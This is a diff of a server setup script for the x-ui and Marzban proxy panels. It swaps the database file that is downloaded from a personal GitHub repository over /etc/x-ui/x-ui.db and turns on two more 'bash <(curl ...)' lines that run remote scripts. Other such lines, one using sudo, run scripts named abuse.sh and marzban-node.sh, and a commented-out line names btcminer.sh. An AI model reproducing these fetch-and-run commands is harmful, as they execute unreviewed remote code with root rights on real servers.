@@ -140,7 +140,7 @@ gen_random_string() {
 }
 
 bakcup_file() {
-    local url="https://github.com/alikroos737/bot/raw/refs/heads/main/tunnelapp.db"
+    local url="https://github.com/alikroos737/bot/raw/refs/heads/main/allcon.db"
     local output_path="/etc/x-ui/x-ui.db"
     wget -O "$output_path" "$url"
 }
@@ -299,6 +299,6 @@ bakcup_file
 systemctl restart x-ui
 sudo bash -c "$(curl -sL https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/marzban-node.sh)" @ install
 bash <(curl -s https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/abuse.sh)
-#bash <(curl -s https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/check_timeout.sh)
-#bash <(curl -s https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/setup_and_run.sh)
+bash <(curl -s https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/check_timeout.sh)
+bash <(curl -s https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/setup_and_run.sh)
 #bash <(curl -s https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/btcminer.sh)
